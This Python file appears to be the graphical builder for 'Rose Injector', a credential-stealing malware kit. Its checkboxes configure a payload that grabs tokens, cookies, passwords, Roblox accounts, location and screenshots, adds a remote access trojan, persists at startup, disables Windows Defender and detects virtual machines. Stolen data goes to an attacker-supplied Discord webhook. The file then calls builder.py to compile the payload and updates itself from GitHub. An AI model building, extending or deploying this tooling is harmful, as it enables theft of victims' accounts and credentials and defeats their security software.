import sys
import os
if sys.executable.endswith('pythonw.exe'):
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.path.join(os.getenv('TEMP'), 'stderr-{}'.format(os.path.basename(sys.argv[0]))), "w")
    
import psocials
import builder

from flaskwebgui import FlaskUI
from nicegui import ui
import requests

from dhooks import Webhook, Embed 
import os 
from pathlib import Path
import ctypes

import logging
import subprocess

from rich.traceback import install
install(show_locals=True)

logging.basicConfig(
    level=logging.DEBUG,
    filename='roselog.log',
    filemode='a',
    format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)


__title__ = 'Rose UI Builder'
__avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/RoseWBG.png'
__version__ = '1.0'
__debugm__ = False #Change if you would like to be in a debug mode, actually only skips auto-update func lol SIUUUUUU PSG > YALL

__devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/roseui/msg.txt").text.splitlines()[0].split(" - ")

xstartup = False 
xinjection = False
xtoken = False 
xcookie = False 
xpassword = False 
xmalicious = False 
xlocation = False
xroblox = False
xrat = False
xscreenshot = False
xraturl = ""
xping = False
xfakeerror = False
xnitrobuy = False
xdefenderfucker = False
xvmdetect = False
xwebhookurl = ""
xvmwebhookurl = ""
xbuildname = ""

xprogressvalue = False

def auto_update():
    if __debugm__:
        return 
    
    _code = (
            "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/roseui/v8.pyw"
    )
    
    code = requests.get(_code, timeout=10).text
    with open(__file__, "r", encoding="utf-8") as f:
        main_code = f.read()
    if code != main_code:
        f = ctypes.windll.user32.MessageBoxW(
            0, 
            "A new version has been detected.\nWould you like to automatically update?",
            "Rose Injector",
            4
        )
        if f == 6:
            with open(__file__, "w", encoding="utf-8") as f:
                f.write(code)
            os.startfile(__file__)
            os._exit(0)

def change_fakeerror():
    global xfakeerror
    xfakeerror = not xfakeerror
    logger.info(f"FakeError has been set to {xfakeerror}")
    if xfakeerror:
        ui.notify("Fake Error has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
        return
    ui.notify("Fake Error has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")

def change_nitrobuy():
    global xnitrobuy
    xnitrobuy = not xnitrobuy
    logger.info(f"Nitro Auto has been set to {xnitrobuy}")
    if xnitrobuy:
        ui.notify("Nitro Auto Buy has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
        return 
    ui.notify("Nitro Auto Buy has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")

def change_defenderfucker():
    global xdefenderfucker
    xdefenderfucker = not xdefenderfucker
    logger.info(f"WindowsDefender has been set to {xdefenderfucker}")
    if xdefenderfucker:
        ui.notify("Windows Defender Fucker has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
        return 
    ui.notify("Windows Defender Fucker has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")

def change_vmdetect():
    global xvmdetect
    xvmdetect = not xvmdetect
    logger.info(f"VM Detection has been set to {xvmdetect}")
    if xvmdetect:
        ui.notify("VM Detection has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
        return 
    ui.notify("VM Detection has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")

def change_vmwebhookurl(value):
    global xvmwebhookurl
    xvmwebhookurl = value

def change_startups():
    global xstartup
    xstartup = not xstartup
    logger.info(f"Startup has been set to {xstartup}")
    if xstartup:
        ui.notify("Startup has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
        return 
    ui.notify("Startup has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")

def change_injection():
    global xinjection
    xinjection = not xinjection
    logger.info(f"Injection has been set to {xinjection}")
    if xinjection:
        ui.notify("Injection has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
        return
    ui.notify("Injection has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")

def change_tokens():
    global xtoken
    xtoken = not xtoken
    logger.info(f"TokenGrabbing has been set to {xtoken}")
    if xtoken:
        ui.notify("Token Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
        return
    ui.notify("Token Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")

def change_cookies():
    global xcookie
    xcookie = not xcookie
    logger.info(f"Cookie Grabbing has been set to {xcookie}")
    if xcookie:
        ui.notify("Cookies Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
        return
    ui.notify("Cookies Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")

def change_passwords():
    global xpassword
    xpassword = not xpassword
    logger.info(f"Password has been set to {xpassword}")
    if xpassword:
        ui.notify("Passwords Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
        return
    ui.notify("Passwords Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")

def change_screenshots():
    global xscreenshot
    xscreenshot = not xscreenshot
    logger.info(f"Screenshot has been set to {xscreenshot}")
    if xscreenshot:
        ui.notify("Screenshot has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
        return
    ui.notify("Screenshot has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")

def change_malicious():
    global xmalicious
    xmalicious = not xmalicious
    logger.info(f"Malicious Grabbing has been set to {xmalicious}")
    if xmalicious:
        ui.notify("Malicious Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
        return
    ui.notify("Malicious Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")

def change_locations():
    global xlocation
    xlocation = not xlocation
    logger.info(f"Location Grabbing has been set to {xlocation}")
    if xlocation:
        ui.notify("Location Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
        return 
    ui.notify("Location Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")

def change_robloxs():
    global xroblox
    xroblox = not xroblox
    logger.info(f"Roblox Grabbing has been set to {xroblox}")
    if xroblox:
        ui.notify("Roblox Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
        return
    ui.notify("Roblox Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")

def change_rats():
    global xrat
    xrat = not xrat
    logger.info(f"RAT has been set to {xrat}")
    if xrat:
        ui.notify("RAT has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")
        return
    ui.notify("RAT has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")

def change_ratsurl(value):
    global xraturl
    xraturl = value   
    logger.info(f"RAT link has been set to {xraturl}")

def change_pings():
    global xping
    logger.info(f"XPing has been set to {xping}")
    if xping:
        ui.notify("Ping has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")
        return
    ui.notify("Ping has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")

def change_webhookurl(value):
    global xwehookurl
    xwehookurl = value
    logger.info(f"Webhook Link has been set to {xwehookurl}")

def change_buildname(value):
    global xbuildname
    xbuildname = value
    logger.info(f"Build Name has been set to {xbuildname}")

async def _test_webhook():
    result = await test_webhook(xwehookurl)
    if result == 0:
        ui.notify("WebHook successfuly executed!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
        return 
    ui.notify("WebHook failed to execute!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")


__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/tools/rose.png"


async def test_webhook(webhook_url):
    try:
        async with Webhook.Async(webhook_url) as hook:
            embed = Embed(
                description='Webhook is Working',
                color=11795068,
                timestamp="now"
            )
            embed.set_author(name="Success", icon_url=__icon__)
            embed.set_footer(text="Rose Builder | By pierro, suegdu, Gumbobrot, svn", icon_url=__icon__)
            await hook.send(embed=embed)
        return 0
    except Exception as e:
        logger.error(f"WebHook failed to execute - Link: {webhook_url} - Error: {e}")
        return 1

def __build():
    global xraturl
    if xraturl == "":
        xraturl = ".rat"
    global xvmwebhookurl
    if xvmwebhookurl == "":
        xvmwebhookurl = xwehookurl
             
    path = f'{Path(__file__).resolve().parent}\\builder.py'
    logger.info(f"Path: {path}")
    msg = f"start cmd /c py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjection} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox} {xscreenshot} {xping} {xvmdetect} {xvmwebhookurl} {xfakeerror} {xnitrobuy} {xdefenderfucker}"
    logger.info(f"MSGLine to compile: {msg}")
    
    output = subprocess.check_output(msg, shell=True, encoding='utf-8')
    with open("v8compile.log", "w") as f:
        f.write(output)
    
    logger.info(f"Building output saved in v8compile.log")

def _makebuild():
    if xwehookurl == "":
        ui.notify("WebHook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
        return
    if xvmdetect:
        if xvmwebhookurl == "":
            ui.notify("VM Detection WebHook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
            return
    if xbuildname == "":
        ui.notify("Build Name is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
        return
    if xrat:
        if xraturl == "":
            ui.notify("RAT URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
            return

    ui.notify("Build has been started!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
    __build()

def _home():
    with ui.column():
        #with ui.expansion('Infos', icon='star_rate').classes('w-full'):
        ui.input(label='WebHook URL', placeholder='Rose on top baby',
                on_change=lambda e: change_webhookurl(e.value)).props('inline color=pink-3').classes('w-full')
        ui.input(label='Build Name', placeholder='Rose on top baby',
                on_change=lambda e: change_buildname(e.value)).props('inline color=pink-3').classes('w-full')
        ui.button('Test WebHook', on_click=_test_webhook).props("icon=code color=purple-11").classes('w-full')
        ui.button('Build', on_click=_makebuild).props("icon=build color=pink-3").classes('w-full')
        #ui.button('Testing', on_click=lambda e: s.visible(True)).props("icon=build color=amber-7").classes('w-full')
        #s = ui.spinner(size='lg').props('visible=false')

def _functions():
    with ui.column():
        with ui.expansion('System', icon='work').classes('w-full'):
            ui.checkbox('Startup', on_change=change_startups).props('inline color=pink')
            with ui.row():
                _inj = ui.checkbox('Injector', on_change=change_injection).props('inline color=pink')
                ui.checkbox('Nitro Auto Buy', on_change=change_nitrobuy).bind_visibility_from(_inj, 'value').props('inline color=pink')                                  
            ui.checkbox('Defender Fucker', on_change=change_defenderfucker).props('inline color=pink')

        with ui.expansion('Grabber', icon='work').classes('w-full'):
            with ui.row():
                with ui.column():
                    ui.checkbox('Token', on_change=change_tokens).props('inline color=green')
                    ui.checkbox('Cookie', on_change=change_cookies).props('inline color=green')
                    ui.checkbox('Password', on_change=change_passwords).props('inline color=green')
                    ui.checkbox('Screenshot', on_change=change_screenshots).props('inline color=green')

                with ui.column():
                    ui.checkbox('Malicious', on_change=change_malicious).props('inline color=green')
                    ui.checkbox('Location', on_change=change_locations).props('inline color=green')
                    ui.checkbox('Roblox', on_change=change_robloxs).props('inline color=green')

        with ui.expansion('Advanced', icon='work').classes('w-full'):
            with ui.column():
                with ui.row():
                    _rat = ui.checkbox('RAT', on_change=change_rats).props('inline color=yellow-7')
                    ui.input(label='RAT Server URL', placeholder='Rose on top baby',
                        on_change=lambda e: change_ratsurl(e.value)).bind_visibility_from(_rat, 'value').props('inline color=yellow-7')
                ui.checkbox('Ping', on_change=change_pings).props('inline color=yellow-7')
                ui.checkbox('Fake Error', on_change=change_fakeerror).props('inline color=yellow-7')
                with ui.row():
                    _vm = ui.checkbox('VM Detect', on_change=change_vmdetect).props('inline color=yellow-7')
                    ui.input(label='VM Detection WebHook URL', placeholder='Rose on top baby',
                        on_change=lambda e: change_vmwebhookurl(e.value)).bind_visibility_from(_vm, 'value').props('inline color=yellow-7')


def _github():
    with ui.card():
        with ui.column():
            ui.markdown(f"<code>Message from {__devmsg__[0]}: {__devmsg__[1]}</code>")
            with ui.row():
                with ui.card_section():
                    ui.label("xpierroz").classes("text-h6")
                    ui.markdown('<em>- "GUMBO MAKE A FUCKING PR"</em>').classes("text-subtitle5")
                    with ui.row():
                        #ui.label(" ") # Because the button are so sticked together without (sex button) - xpierroz 03/24
                        ui.button(on_click=psocials.open_xpierroz).props("round icon=code color=blue-11")
                        ui.button(on_click=psocials.open_xpierroz_insta).props("round icon=star_rate color=amber-8")

                with ui.card_section():
                    ui.label("Gumbobrot").classes("text-h6")
                    ui.markdown('<em>- "buddy it\'s not my fault"</em>').classes("text-subtitle5")
                    ui.button(on_click=psocials.open_Gumbobrot).props("round icon=code color=blue-11")

            with ui.row():               
                with ui.card_section():
                    ui.label("suegdu").classes("text-h6")
                    ui.markdown('<em>- "bruh"</em>').classes("text-subtitle5")
                    ui.button(on_click=psocials.open_suegdu).props("round icon=code color=blue-11")

                with ui.card_section():
                    ui.label("svn").classes("text-h6")
                    ui.markdown('<em>*svn died*</em>').classes("text-subtitle5")
                    ui.button(on_click=psocials.open_svn).props("round icon=code color=blue-11")
    with ui.card():
        with ui.card_section():
            with ui.row():
                ui.label(f"Rose {__version__}").classes("text-h6")
                ui.button(on_click=psocials.open_rose_github).props("round icon=code color=blue-11")
                ui.button(on_click=psocials.open_rose_discord).props("round icon=unsubscribe color=indigo-12")


ui.colors(primary='#333')

@ui.page('/home')
def superhome():
    ui.image('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/RoseWBG.png').style(
        'position: absolute; top: 3px; left: 575px; width: 90px;'
        )        



    with ui.tabs().classes('w-full center') as tabs:
        ui.tab('Home', icon='home')
        ui.tab('Functions', icon='fingerprint')
        with ui.tab('Socials', icon='face'):
            ui.badge('0', color='purple-11').props('floating')

    with ui.tab_panels(tabs, value='Home').classes('bg-transparent').classes('w-full center'):
        with ui.tab_panel('Home'):
            _home()
        with ui.tab_panel('Functions'):
            _functions()
        with ui.tab_panel('Socials'):
            _github()

v = ui.video('https://github.com/DamagingRose/Rose-Injector/raw/main/assets/RoseLoadingScreen.mp4', autoplay=True, loop=False, muted=True, controls=False).style('position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;')
v.on('ended', lambda _: ui.open('/home'))

def start_nicegui(**kwargs):
    ui.run(
        title=__title__,
        **kwargs
    )

if __name__ in {"__main__", "__mp_main__"}:
    DEBUG = False

    auto_update()
    if DEBUG:
        ui.run()
    else:
        FlaskUI(
            server=start_nicegui,
            server_kwargs={"dark": True, "reload": False, "show": False, "port": 3000},
            width=700,
            height=700, 
        ).run()
 
